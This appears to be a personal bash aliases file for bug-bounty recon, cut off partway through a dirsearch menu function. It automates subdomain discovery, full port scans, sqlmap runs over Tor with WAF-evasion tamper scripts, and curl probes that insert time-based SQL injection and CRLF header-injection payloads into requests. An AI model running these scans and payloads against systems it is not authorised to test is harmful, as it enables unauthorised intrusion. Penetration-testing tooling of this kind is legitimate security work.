# reloads aliases in current terminal without the need to close and start a new
reload(){
	source ~/.bash_aliases
	echo ".bash_aliases reloaded"
}

# para descargar la ultima version de .bash_aliases y commonwords
reinstall(){
	echo -e "\e[32m"
	cd ~/
	mkdir -p ~/tools/{__diccionarios,recon,results,crons}
	git clone https://github.com/estebancano-dev/BashAliases.git
	cp ~/BashAliases/.bash_aliases ~/
	rm -r ~/BashAliases
	git clone https://github.com/estebancano-dev/commonwords.git
	mv ~/commonwords/* ~/tools/__diccionarios
	rm -r ~/commonwords
	git clone https://github.com/estebancano-dev/crons.git
	mv ~/crons/* ~/tools/crons/
	rm -r ~/crons
	sudo chmod +x ~/tools/crons/*.sh
	reload
	echo -e "\033[0m"
}

# scans for js files with https://github.com/ffuf/ffuf on a list of urls in a file
# usage: scanjs file.txt
# output: urls found with 200 http responses
scanjs(){
	now=$(date +"%Y%m%d%H%M%S")
	echo "Scanjs started $now. Log file: scanjs_$now.txt" | tee -a scanjs_$now.txt
	cat $1 | while read line; do 
		FILENAME=$line
		FUZZ="FUZZ"
		EXT=".js"
		echo "Scanning...$FILENAME$FUZZ$EXT" | tee -a scanjs_$now.txt
		echo "Wordlist 1.txt..." | tee -a scanjs_$now.txt
		SECONDS=0
		ffuf -u "$FILENAME$FUZZ$EXT" -s -c -mc "200" -w ~/tools/__diccionarios/1.txt | tee -a scanjs_$now.txt
		echo "Finished in $SECONDS seconds" | tee -a scanjs_$now.txt
		echo "Wordlist 2.txt..." | tee -a scanjs_$now.txt
		SECONDS=0
		ffuf -u "$FILENAME$FUZZ$EXT" -s -c -mc "200" -w ~/tools/__diccionarios/2.txt | tee -a scanjs_$now.txt
		echo "Finished in $SECONDS seconds" | tee -a scanjs_$now.txt
		echo "Wordlist 3.txt..." | tee -a scanjs_$now.txt
		SECONDS=0
		ffuf -u "$FILENAME$FUZZ$EXT" -s -c -mc "200" -w ~/tools/__diccionarios/3.txt | tee -a scanjs_$now.txt
		echo "Finished in $SECONDS seconds" | tee -a scanjs_$now.txt
	done
}

# scans for subdomains files with https://github.com/ffuf/ffuf on a list of urls in a file
# usage: scansub file.txt
# output: urls found with XXX http responses
scansub(){
	now=$(date +"%Y%m%d%H%M%S")
	h="http://FUZZ."
	http="http://"
	https="https://"
	echo "Scansub started $now. Log file: scansub_$now.txt" | tee -a scansub_$now.txt
	cat $1 | while read line; do
		if [ ${line:0:8} = "https://" ]; then
		    h="https://FUZZ."
		fi 
		foo=${line/$http/}
		foo=${line/$https/}
		echo "curl -s -H \"Host: nonexistent.$foo\" $line |wc -c"
		length=$(curl -s -H \"Host: nonexistent.$foo\" $line |wc -c)
		echo "ffuf -u \"$h$foo\" -s -c -w ~/tools/__diccionarios/1y4.txt -fs $length | tee -a scansub_$now.txt"
		#echo "Scanning...$line" | tee -a scansub_$now.txt
		#echo "Wordlist 1y4.txt..." | tee -a scansub_$now.txt
		#SECONDS=0
		#ffuf -u "$h$foo" -s -c -w ~/tools/__diccionarios/1y4.txt -fs $length | tee -a scansub_$now.txt
		#echo "Finished in $SECONDS seconds" | tee -a scansub_$now.txt
		#echo "Wordlist 3y2.txt..." | tee -a scansub_$now.txt
		#SECONDS=0
		#ffuf -u "$h$foo" -s -c -w ~/tools/__diccionarios/3y2.txt | tee -a scansub_$now.txt
		#echo "Finished in $SECONDS seconds" | tee -a scansub_$now.txt
	done
}

# creates a new file with unique and ordered lines from source file 
# usage: uniquelines file.txt
# output: fileunique.txt
uniquelines(){
	FILENAME=$1
	NEWFILENAME="${FILENAME%%.*}unique.${FILENAME#*.}"
	totallines=$(wc -l $FILENAME | awk '{ print $1 }')
	sort -u $FILENAME > $NEWFILENAME
	totalnewlines=$(wc -l $NEWFILENAME | awk '{ print $1 }')
	total=$((totallines - totalnewlines))
	echo "$total from $totallines duplicated lines deleted. File created: $NEWFILENAME"
}

# creates a new file with email accounts found in source file
# usage: grepemails file.txt
# output: fileemails.txt
grepemails(){
	FILENAME=$1
	grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" $1 > "${FILENAME%%.*}emails.txt"
	echo "File created: ${FILENAME%%.*}emails.txt"
}

ipinfo(){
	curl http://ipinfo.io/$1
}

check(){
	assetfinder $1 | grep $1 | httprobe
}

# Given a domain name and optionally an ASN number (comma separated numbers, eg:62566,17012) scans for subdomains, tries to resolve them, shows web services, check for alive ones and makes portscan
# Also check for header sqli, header redirect, sqlmap of wayback urls, makes screenshots
# Uses: assetfinder, subfinder, sublist3r, amass, altdns, massdns, httprobe, nmap, masscan, header sqli, header redirect, sqlmap, eyewitness
# usage: subdomains domain.com [ASNNUMBERS]
# output: list of alive subdomains, open ports, vulns
#		
subdomains(){
	clear
	begin=$(date +"%s")
	now=$(date +"%Y%m%d%H%M%S")
	mkdir -p ~/tools/recon/$1/$now/
	cd ~/tools/recon/$1/$now/
	touch 1scrap1$1.txt 1scrap2$1.txt 1scrap3$1.txt 1scrap4$1.txt salida.txt

	echo -e "\e[32mUrl: $1 $2\033[0m" | tee -a salida.txt
	echo -e "\e[32m************ Starting Scrapping... ************\033[0m" | tee -a salida.txt
	echo -e "\e[32m\tDoing Assetfinder...\033[0m" | tee -a salida.txt
	assetfinder $1 > 1scrap1$1.txt < /dev/null 2>&1
	
	echo -e "\e[32m\tDoing Subfinder...\033[0m" | tee -a salida.txt
	subfinder -t 100 -d $1 -silent -o 1scrap2$1.txt > /dev/null 2>&1
	
	echo -e "\e[32m\tDoing Sublist3r...\033[0m" | tee -a salida.txt
	python ~/tools/Sublist3r/sublist3r.py -d $1 -o 1scrap3$1.txt > /dev/null 2>&1
	
	echo -e "\e[32m\tDoing Amass...\033[0m" | tee -a salida.txt
	amass enum -active -noalts -norecursive -d $1 -o 1scrap4$1.txt > /dev/null 2>&1
	
	# junto los resultados, quito dominios que no sirven (si busco *.google.com a veces aparece ihategoogle.com, y no es parte del scope)
	grep --no-filename "\.$1\|^$1$" 1scrap1$1.txt 1scrap2$1.txt 1scrap3$1.txt 1scrap4$1.txt > 1scrap$1.txt
	# borro los archivos temporales
	rm -f 1scrap1$1.txt 1scrap2$1.txt 1scrap3$1.txt 1scrap4$1.txt 2> /dev/null
	# borro <BR> de la salida del Sublist3r, a veces pasa
	sed -i 's/<BR>/\r\n/g' 1scrap$1.txt
	# los ordeno y quito dominios duplicados
	sort -u -o 1scrap$1.txt 1scrap$1.txt 

	if [[ -f 1scrap$1.txt && ! -s 1scrap$1.txt ]]; then
		echo -e "\e[32m*********** No domains scrapped... ************\033[0m" | tee -a salida.txt
		echo -e "\e[32m***********************************************\033[0m" | tee -a salida.txt
		return
	fi

	# altdns con los dominios en bruto (solo para menos de 3000 dominios, sino el archivo generado es gigantrópico)
	if [[ $(wc -l <1scrap$1.txt) -le 3000 ]]; then
		echo -e "\e[32m\tDoing Altdns to generate alternative domains...\033[0m" | tee -a salida.txt
		altdns -i 1scrap$1.txt -o altdns$1.txt -w ~/tools/__diccionarios/altdns.txt
		grep "\.$1\|^$1$" altdns$1.txt | sort -u >> altdns$1.txt
		# de la lista de alternativos (son aquellos no listados/ocultos, hay mas chances de que no estén testeados), quito los originales
		touch altdns2$1.txt
		cat 1scrap$1.txt | while read dom; do
			#sed -i "/^$dom/d" altdns$1.txt# saque esto porq si el altdns es grande, para cada ciclo crea un temporal y va reemplazando
			esta=$(grep -ix "$dom" altdns$1.txt)
			if [ -z "$esta" ]; then
				echo "$dom" >> altdns2$1.txt
			fi
		done
		mv altdns2$1.txt altdns$1.txt
		count=$(cat "altdns$1.txt" | wc -l)
		echo -e "\e[32m\tGenerated $count alternative domains...\033[0m" | tee -a salida.txt
	fi
	
	echo -e "\e[32m************** Scrapping done... **************\033[0m" | tee -a salida.txt
	echo -e "\e[32m********** Starting DNS Resolving... **********\033[0m" | tee -a salida.txt
	echo -e "\e[32m\tDoing Massdns to scrapped domains...\033[0m" | tee -a salida.txt
	massdns -q -r ~/tools/massdns/lists/resolvers.txt -w 2massdns$1.txt 1scrap$1.txt
	# resuelvo los dominios alternativos
	if [[ -f altdns$1.txt && -s altdns$1.txt ]]; then
		echo -e "\e[32m\tDoing Massdns to alternative domains...\033[0m" | tee -a salida.txt
		massdns -q -o S -r ~/tools/massdns/lists/resolvers.txt -w altdnsresolved$1.txt altdns$1.txt
		count=$(cat "altdnsresolved$1.txt" | wc -l)
		echo -e "\e[32m\t$count alternative domains resolved...\033[0m" | tee -a salida.txt
	fi
	rm altdns$1.txt 2> /dev/null
	massdns -q -o S -r ~/tools/massdns/lists/resolvers.txt -w 8massdnssimple$1.txt 1scrap$1.txt
	
	if [[ -f 2massdns$1.txt && ! -s 2massdns$1.txt ]]; then
		echo -e "\e[32m*********** No domains resolved... ************\033[0m" | tee -a salida.txt
		echo -e "\e[32m***********************************************\033[0m" | tee -a salida.txt
		return
	fi
	echo -e "\e[32m************ DNS Resolving done... ************\033[0m" | tee -a salida.txt
	
	echo -e "\e[32m********** Starting Alive Checking... *********\033[0m" | tee -a salida.txt
	echo -e "\e[32m\tDoing httprobe...\033[0m" | tee -a salida.txt
	cat 1scrap$1.txt | httprobe -t 5000 > 6httprobe$1.txt

	# save all contents for later cve scan
	cat 6httprobe$1.txt ~/cvescan/myrecon.txt | sort -u -o >> ~/cvescan/myrecon.txt

	# for sqlmap
	cat 6httprobe$1.txt | unfurl -u format "%s://%d%:%P" > resolved$1.txt
	
	echo -e "\e[32m\tDoing Nmap to check if alive...\033[0m" | tee -a salida.txt
	nmap -sP -T5 -iL 1scrap$1.txt > 3nmap$1.txt < /dev/null 2>&1
	
	# agrego a la lista de IP los rangos ASN (si se agregó el segundo parámetro)
	re='^[0-9](,[0-9])*$'
	if [[ $2 =~ $re ]]; then
		touch asnip$1.txt
		echo -e "\e[32m\tDoing Nmap to check ASN alive IP...\033[0m" | tee -a salida.txt
		for i in $(echo $2 | tr "," "\n"); do
			nmap -Pn --script targets-asn --script-args targets-asn.asn=$i --min-rate=3000 | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" >> asnip$1.txt < /dev/null 2>&1
		done
		if [[ -f asnip$1.txt && -s asnip$1.txt ]]; then
			nmap -sP -T5 --min-rate=3000 -iL asnip$1.txt >> 3nmap$1.txt < /dev/null 2>&1
		fi
		echo -e "\e[32m\tDoing Nmap to check ASN alive IP done ...\033[0m" | tee -a salida.txt
	fi

	# extract ip and order/unique them
	cat 3nmap$1.txt | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" > 4nmapips$1.txt
	if [[ -f altdnsresolved$1.txt && -s altdnsresolved$1.txt ]]; then
		# extract alternative ips
		grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" altdnsresolved$1.txt >> 4nmapips$1.txt
	fi
	sort -u -o 4nmapips$1.txt 4nmapips$1.txt
	
	# vuelo ip privadas, 0.0.0.0 (a veces aparece y el scan tarda mucho) y lineas en blanco. https://en.wikipedia.org/wiki/Private_network
	sed -i -E '/192\.168|10\.|172\.1[6789]\.|172\.2[0-9]\.|172\.3[01]\.|127.0.0.1|0.0.0.0|100\.[6789]|100\.1[01][0-9]\.|100\.12[0-7]\.|^$/d' 4nmapips$1.txt
	
	# cuento la cantidad de alive hosts y la cantidad de IP únicas encontradas
	count=$(grep -c "Host is up" 3nmap$1.txt)
	ips=$(wc -l 4nmapips$1.txt | awk '{ print $1 }')
	echo -e "\e[32m\t$count domains pointing to $ips IP addresses\033[0m" | tee -a salida.txt
	echo -e "\e[32m************ Alive Checking done... ***********\033[0m" | tee -a salida.txt
	
	echo -e "\e[32m********** Starting Port scanning... **********\033[0m" | tee -a salida.txt
	echo -e "\e[32m\tDoing Masscan...\033[0m" | tee -a salida.txt
	masscan -p0-65535 -iL 4nmapips$1.txt -oG 5masscan$1.txt --rate 50000 --http-user-agent Mozilla > /dev/null 2>&1

	if [[ -f 4nmapips$1.txt && -s 4nmapips$1.txt ]]; then
		echo -e "\e[32m\tDoing Nmap to check port service versions...\033[0m" | tee -a salida.txt
		touch 7nmapservices$1.txt
		cat 4nmapips$1.txt | while read ipaescanear; do
			ports=$(nmap -Pn -p- --min-rate=30000 -T4 $ipaescanear | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
			length=$(echo $ports | sed 's/[^,]//g' | awk '{ print length }')
			# escaneo hasta 40 puertos, a veces el nmap detecta (de cloudflare x ejemplo) cientos de puertos abiertos, y es mentira
			if (($length <= 40)); then
				# -sC es más rapido que -sV
				nmap -Pn -sS -p$ports -T5 --script=vuln $ipaescanear >> 7nmapservices$1.txt < /dev/null 2>&1
			fi
		done
	fi	
	echo -e "\e[32m************* Port scanning done... ***********\033[0m" | tee -a salida.txt
	
	echo -e "\e[32m************ Vulnerabilities test... **********\033[0m" | tee -a salida.txt
	count=$(cat "resolved$1.txt" | wc -l)
	echo -e "\e[32m\tGetting Wayback urls for $count urls... \033[0m" | tee -a salida.txt
	for dom in `cat resolved$1.txt`; do 
		now=$(date +"%Y%m%d%H%M%S")
		echo "$dom" | waybackurls > l$now.txt
		echo "$dom" | gau -subs >> l$now.txt
		sort -u -o l$now.txt l$now.txt
		if [[ -f l$now.txt && ! -s l$now.txt ]]; then
			rm l$now.txt
			continue
		fi
		
		# limpio las urls (dejo solo 1 url con el mismo path y distintos parametros)
		uniqueurls l$now.txt lista$nombre$now.txt
		rm l$now.txt
		
		if [[ -f lista$nombre$now.txt && ! -s lista$nombre$now.txt ]]; then
			rm lista$nombre$now.txt
			continue
		fi
		
		echo -e "\e[32m\tStarting Sqli Check...\033[0m" | tee -a salida.txt
		touch sqlmap$nombre$now.txt xss$nombre$now.txt
		for i in `cat lista$nombre$now.txt`; do 
			#python ~/tools/XSStrike/xsstrike.py -t 10 --crawl -l 3 --file-log-level WARNING --fuzzer -d 3 -u "$i" >> xss$nombre$now.txt < /dev/null 2>&1 &
			echo "************************* Testing $i *************************" >> sqlmap$nombre$now.txt
			python ~/tools/sqlmap-dev/sqlmap.py -u "$i" -v 0 --level=5 --risk=3 --threads=10 --answers="follow=Y" --batch --current-user --current-db --dbs --hostname --tor --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,randomcomments,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords >> sqlmap$nombre$now.txt 
		done		
		echo -e "\e[32m\tSqli Check done...\033[0m" | tee -a salida.txt

		# echo -e "\e[32m\tDetecting parameters...\033[0m" | tee -a salida.txt
		# arjun --urls lista$nombre$now.txt --get -t 30 -o arjunget$nombre$now.txt < /dev/null 2>&1 &
		# arjun --urls lista$nombre$now.txt --post -t 30 -o arjunpost$nombre$now.txt < /dev/null 2>&1 &
		# arjun --urls lista$nombre$now.txt --json -t 30 -o arjunjson$nombre$now.txt < /dev/null 2>&1 &
		# echo -e "\e[32m\tParameter Detecting done...\033[0m" | tee -a salida.txt

		echo -e "\e[32m\tStarting Headers Check...\033[0m" | tee -a salida.txt
		echo -e "\e[32m\tDoing Curl to check headers for SQLi ...\033[0m" | tee -a salida.txt
		checkheadersforsqli lista$nombre$now.txt checkheader_sqli$1.txt | tee -a salida.txt
		echo -e "\e[32m\tDoing Curl to check headers for redirect...\033[0m" | tee -a salida.txt
		checkheadersforredirect lista$nombre$now.txt checkheader_redirect$1.txt | tee -a salida.txt
		echo -e "\e[32m\tDoing Curl to check headers for injection...\033[0m" | tee -a salida.txt
		checkheadersforinjection lista$nombre$now.txt checkheader_inject$1.txt | tee -a salida.txt
		echo -e "\e[32m\tHeaders Check done... \033[0m" | tee -a salida.txt
		
	done
	echo -e "\e[32m********* Vulnerabilities test done ... *******\033[0m" | tee -a salida.txt
	
	echo -e "\e[32m***************** Screenshots... **************\033[0m" | tee -a salida.txt
	echo -e "\e[32m\tDoing EyeWitness to httprobe results...\033[0m" | tee -a salida.txt
	python ~/tools/EyeWitness/EyeWitness.py -f 6httprobe$1.txt -d ./EyeWitness > /dev/null 2>&1
	rm geckodriver.log 2> /dev/null
	
	echo -e "\e[32m******************** The End *******************\033[0m" | tee -a salida.txt
	end=$(date +"%s")
	diff=$(($end-$begin))
	cad="subdomains($1) finished in $(($diff / 60))m $(($diff % 60))s."
	echo "$cad" | tee -a salida.txt
	send $cad
}

# Gets an url with curl and adds every header to check for potential sqli injections (if response time > 8 seconds)
# usage: checkheadersforsqli urllist.txt outputheaderswithsqli.txt
# output: list of urls and headers with potential sqli
checkheadersforsqli(){
	if [[ -f $1 && ! -s $1 ]]; then
		echo -e "\e[32m\tUrls file is empty!\033[0m"
		return
	fi
	if [[ -f ~/tools/__diccionarios/headers.txt && ! -s ~/tools/__diccionarios/headers.txt ]]; then
		echo -e "\e[32m\tNo headers file found!\033[0m"
		return
	fi
	i=0
	cat $1 | while read url; do
		regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
		if [[ $url =~ $regex ]]; then 
			cat ~/tools/__diccionarios/headers.txt | while read head; do
				response=$(curl -X GET -H 'User-Agent:' -H "$head: \"XOR(if(now()=sysdate(),sleep(8),0))OR\"" -s -I -L -w "%{time_starttransfer}" --max-redirs 3 --connect-timeout 15 --max-time 15 $url)
				time=$(echo "$response" | tail -1 | awk -F  "." '{print $1}')
				if [[ $time =~ '^[0-9]+$' ]]; then
					if (($time >= 8)); then
						echo "\r\n*** URL: $url - Header: $head\r\n" >> $2
						echo "$response" >> $2
						((i++))
					fi
				fi
			done
		fi
	done
	echo -e "\e[32m\tFound $i headers with potential sqli... \033[0m"
}

# Gets an url with curl and adds every header to check for redirect
# usage: checkheadersforredirect urllist.txt outputurlswithredirection.txt
# output: list of urls and headers with redirection
checkheadersforredirect(){
	if [[ -f $1 && ! -s $1 ]]; then
		echo -e "\e[32mUrls file is empty!\033[0m"
		return
	fi
	i=0
	cat $1 | while read url; do
		regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
		if [[ $url =~ $regex ]]; then 
			response=$(curl -X GET -H "X-Forwarded-For: estebancano.com.ar/abc.php" -s -L --max-redirs 10 --connect-timeout 15 --max-time 15 $url)
			if [[ $response == *"<!-- CH3CK -->"* ]]; then
				echo "\r\n*** URL: $url - Header: X-Forwarded-For: estebancano.com.ar/abc.php" >> $2
				((i++))
			fi
			response=$(curl -X GET -H "X-Forwarded-Host: estebancano.com.ar/abc.php" -s -L --max-redirs 10 --connect-timeout 15 --max-time 15 $url)
			if [[ $response == *"<!-- CH3CK -->"* ]]; then
				echo "\r\n*** URL: $url - Header: X-Forwarded-Host: estebancano.com.ar/abc.php" >> $2
				((i++))
			fi
		fi
	done
	echo -e "\e[32m\tFound $i headers with potential redirect... \033[0m"
}

# Gets an url with curl and adds every header to check for sqli injections
# usage: checkheadersforinjection urllist.txt outputurlswithinjection.txt
# output: list of urls and headers with redirection
checkheadersforinjection(){
	if [[ -f $1 && ! -s $1 ]]; then
		echo -e "\e[32mUrls file is empty!\033[0m"
		return
	fi
	i=0
	cat $1 | while read url; do
		regex='(https?)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'
		if [[ $url =~ $regex ]]; then 
			response=$(curl -sLiH "User-agent:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a" $url)
			if [[ $response == *"<!-- CH3CK -->"* ]]; then
				echo "\r\n*** Header User-agent injected: User-agent:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection in $url" >> $2
				((i++))
			fi
			response=$(curl -H "User-agent:" -sLiH "X-forwarded-for:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a" $url)
			if [[ $response == *"<!-- CH3CK -->"* ]]; then
				echo "\r\n*** Header X-forwarded-for injected: X-forwarded-for:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection in $url" >> $2
				((i++))
			fi
			response=$(curl -H "User-agent:" -sLiH "Referer:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a" $url)
			if [[ $response == *"<!-- CH3CK -->"* ]]; then
				echo "\r\n*** Header Referer injected: Referer:xx%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection in $url" >> $2
				((i++))
			fi
			response=$(curl -sLiH "User-agent:" $url?%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a)
			if [[ $response == *"<!-- CH3CK -->"* ]]; then
				echo "\r\n*** Url query injected: $url?%0aLocation:estebancano.com.ar/abc.php?checkheadersforinjection%0a in $url" >> $2
				((i++))
			fi
		fi
	done
	echo -e "\e[32m\tFound $i headers injected... \033[0m"
}

checkheaders(){
	now=$(date +"%Y%m%d%H%M%S")
	echo -e "\e[32m\tWaybacking urls...\033[0m"
	for i in `cat $1`; do 
		nombre=$(echo "$i" | unfurl format "%d")
		echo "$i" | waybackurls | grep "\?" > ~/tools/checkheaders/urls$nombre$now.txt
		echo "$i" | gau -subs | grep "\?" >> ~/tools/checkheaders/urls$nombre$now.txt
		sort -u -o ~/tools/checkheaders/urls$nombre$now.txt ~/tools/checkheaders/urls$nombre$now.txt
		if [[ -f ~/tools/checkheaders/urls$nombre$now.txt && ! -s ~/tools/checkheaders/urls$nombre$now.txt ]]; then
			continue
		fi
		
		uniqueurls ~/tools/checkheaders/urls$nombre$now.txt ~/tools/checkheaders/lista$nombre$now.txt
		rm ~/tools/checkheaders/urls$nombre$now.txt
		
		if [[ -f ~/tools/checkheaders/lista$nombre$now.txt && ! -s ~/tools/checkheaders/lista$nombre$now.txt ]]; then
			continue
		fi
		
		count=$(cat ~/tools/checkheaders/lista$nombre$now.txt | wc -l)
		echo -e "\e[32m\tStarting Headers Check for $count urls...\033[0m" | tee -a ~/tools/checkheaders/$nombre$now.txt
		echo -e "\e[32m\tDoing Curl to check headers for SQLi ...\033[0m" | tee -a ~/tools/checkheaders/$nombre$now.txt
		checkheadersforsqli ~/tools/checkheaders/lista$nombre$now.txt ~/tools/checkheaders/checkheader_sqli$1.txt | tee -a ~/tools/checkheaders/$nombre$now.txt
		echo -e "\e[32m\tDoing Curl to check headers for redirect...\033[0m" | tee -a ~/tools/checkheaders/$nombre$now.txt
		checkheadersforredirect ~/tools/checkheaders/lista$nombre$now.txt ~/tools/checkheaders/checkheader_redirect$1.txt | tee -a ~/tools/checkheaders/$nombre$now.txt
		echo -e "\e[32m\tDoing Curl to check headers for injection...\033[0m" | tee -a ~/tools/checkheaders/$nombre$now.txt
		checkheadersforinjection ~/tools/checkheaders/lista$nombre$now.txt ~/tools/checkheaders/checkheader_inject$1.txt | tee -a ~/tools/checkheaders/$nombre$now.txt
		echo -e "\e[32m\tHeaders Check done... \033[0m" | tee -a ~/tools/checkheaders/$nombre$now.txt
		rm ~/tools/checkheaders/lista$nombre$now.txt
	done
}

# Gets a file with lots of urls (with params) and tries to uniques them. Avoid images, fonts and css. Reduces urls for testing to 10%
# usage: uniqueurls urllist.txt output.txt
# output: list of distinct urls. If same path, then different numbers of params
# now just uses a php script to do the trick as this is sooo slow
uniqueurls(){
	if [ ! $# -eq 2 ]; then
		echo -e "\e[32mParameter is missing!\033[0m"
		return
	fi
	if [[ -f $1 && ! -s $1 ]]; then
		echo -e "\e[32mUrls file is empty!\033[0m"
		return
	fi

	querya=""
	patha=""
	urla=""
	touch $2
	sort -u -o $1 $1
	for i in `cat $1`; do 
		file=$(echo "$i" | unfurl format %p | tr '[:upper:]' '[:lower:]')
		queryb=$(echo "$i" | unfurl format "%q")
		if [[ ! $file =~ .jpg|.jpeg|.gif|.png|.css|.woff|.woff2|.eot|.svg|.ttf|.js|.ico|.htc && ! $queryb =~ utm_campaign|utm_source|utm_medium ]]; then 
			paramsb=$(echo "$i" | unfurl keys | wc -l)
			if [[ (( $paramsb>0 )) ]]; then
				echo "$i" >> $2
			fi
		fi
	done
}

popandpull(){
	primera=$(head -1 $1)
	tail -n +2 $1 > urls.tmp && mv urls.tmp $1
	echo "$primera" >> urls.txt
	echo "$primera" | tr -d '\r\n'
}

# Find all resolved*.txt in recon directory, merges them and check for CNAME records
# usage: takeover [word]
# output: list of domains with CNAME records for resolvedword*.txt (eg: resolvedstarbucks*.txt), to manually check for subdomains takeover
takeover(){
	now=$(date +"%Y%m%d%H%M%S")
	cat $(find ~/tools/recon -type f -name "resolved$1*.txt") | unfurl domains -u > ~/tools/takeovers/resolved$now.txt
	if [[ -f ~/tools/takeovers/resolved$now.txt && ! -s ~/tools/takeovers/resolved$now.txt ]]; then
		echo -e "\e[32mUrls file is empty!\033[0m"
		return
	fi
	sort -u -o ~/tools/takeovers/resolved$now.txt ~/tools/takeovers/resolved$now.txt
	massdns -q -o S -r ~/tools/massdns/lists/resolvers.txt -t CNAME --verify-ip -w ~/tools/takeovers/takeover$now.txt ~/tools/takeovers/resolved$now.txt
	cat ~/tools/takeovers/takeover$now.txt | awk '{ print $3 }' | sort -u > ~/tools/takeovers/takeover2$now.txt
	massdns -q -r ~/tools/massdns/lists/resolvers.txt -w ~/tools/takeovers/final$now.txt ~/tools/takeovers/takeover2$now.txt
}

checkwebalive(){
	nmap -sn -Pn $1 --script hostmap-crtsh | awk '{ print $2 }' | grep $1 | check $1
}

dirsearch(){
	PS3='Please enter your choice: '
	options=("no ext" "dirs" "js" "php" "txt" "custom ext" "custom ext dicc 1-5" "custom ext custom dir" "no ext file" "all ext" "Backup Files" "custom dict from url and dirsearch" "Quit")
	select opt in "${options[@]}"
	do
		case $opt in
			"no ext")
				cat ~/tools/dirsearch/db/dicc.txt ~/tools/__diccionarios/commonwords.txt | sort -u -o ~/tools/__diccionarios/commonwords.txt
				python ~/tools/dirsearch/dirsearch.py -r --full-url --max-recursion-depth 10 --recursion-status 200-399 -t 50 -f -e , -w ~/tools/__diccionarios/commonwords.txt -u $1 $2
				break
				;;
			"dirs")
				cat ~/tools/dirsearch/db/dicc.txt ~/tools/__diccionarios/dir.txt | sort -u -o ~/tools/__diccionarios/dir.txt
				python ~/tools/dirsearch/dirsearch.py -r --full-url --max-recursion-depth 10 --recursion-status 200-399 -t 50 -f -e , -w ~/tools/__diccionarios/dir.txt -u $1 $2
				break
				;;
			"js")
				cat ~/tools/dirsearch/db/dicc.txt ~/tools/__diccionarios/js.txt | sort -u -o ~/tools/__diccionarios/js.txt
				python ~/tools/dirsearch/dirsearch.py -r --full-url --max-recursion-depth 10 --recursion-status 200-399 -t 50 -f -e , -w ~/tools/__diccionarios/js.txt -u $1 $2
				break
				;;
			"php")
				cat ~/tools/dirsearch/db/dicc.txt ~/tools/__diccionarios/php.txt | sort -u -o ~/tools/__diccionarios/php.txt
				python ~/tools/dirsearch/dirsearch.py -r --full-url --max-recursion-depth 10 --recursion-status 200-399 -t 50 -f -e , -w ~/tools/__diccionarios/php.txt -u $1 $2
				break
				;;
			"txt")
				cat ~/tools/dirsearch/db/dicc.txt ~/tools/__diccionarios/txt.txt | sort -u -o ~/tools/__diccionarios/txt.txt
				python ~/tools/dirsearch/dirsearch.py -r --full-url --max-recursion-depth 10 --recursion-status 200-399 -t 50 -f -e , -w ~/tools/__diccionarios/txt.txt -u $1 $2
				break
				;;
			"custom ext")
				cat ~/tools/dirsearch/db/dicc.txt ~/tools/__diccionarios/commonwords.txt | sort -u -o ~/tools/__diccionarios/commonwords.txt
				python ~/tools/dirsearch/dirsearch.py -r --full-url --max-recursion-depth 10 --recursion-status 200-399 -t 50 -f -e $2 -w ~/tools/__diccionarios/commonwords.txt -u $1 $3
				break
				;;
			"custom ext dicc 1-5")
				python ~/tools/dirsearch/dirsearch.py -r --full-url --max-recursion-depth 10 --recursion-status 200-399 -t 50 -f -e $2 -w ~/tools/__diccionarios/1-5.txt -u $1 $3
				break
				;;
			"custom ext custom dir")
				if [[ -f ~/tools/__diccionarios/$3 && ! -s ~/tools/__diccionarios/$3 ]]; then
					echo -e "\e[32mDict file is empty!\033[0m"
					return
				fi
				python ~/tools/dirsearch/dirsearch.py -r --full-url --max-recursion-depth 10 --recursion-status 200-399 -t 50 -f -e $2 -w ~/tools/__diccionarios/$3 -u $1 $4
				break
				;;
			"no ext file")
				python ~/tools/dirsearch/dirsearch.py -r --full-url --max-recursion-depth 10 --recursion-status 200-399 -t 50 -f -l $1 -e , | tee dirsearch$1.txt
				break
				;;
			"all ext")
				python ~/tools/dirsearch/dirsearch.py -r --full-url --max-recursion-depth 10 --recursion-status 200-399 -t 50 -f -e ,json,js,html,htm,html~,htm~,bck,bck~,tmp,_js,js~,_tmp,tmp~,asp,aspx,inc.php,php,php~,txt,txt~,pl,jsp,jsp~,py,rb,cfg,cfg~,zip,zip~,pdf,gz,gz~,tar,tar~,tar.gz,tar.gz~,tgz,doc,doc~,docx,xls,xlsx,conf,conf~,do,action -w ~/tools/__diccionarios/commonwords.txt -u $1 $2
				break
				;;
			"Backup Files")
				python ~/tools/dirsearch/dirsearch.py -r --full-url --max-recursion-depth 10 --recursion-status 200-399 -t 50 -f -e $2 -w ~/tools/__diccionarios/backupfiles.txt -u $1 $3
				break
				;;
			"custom dict from url and dirsearch")
				customdictfromurl $1
				if [[ -f ~/tools/__diccionarios/dictionary$1.txt && ! -s ~/tools/__diccionarios/dictionary$1.txt ]]; then
					echo -e "\e[32mDict file is empty!\033[0m"
					return
				fi
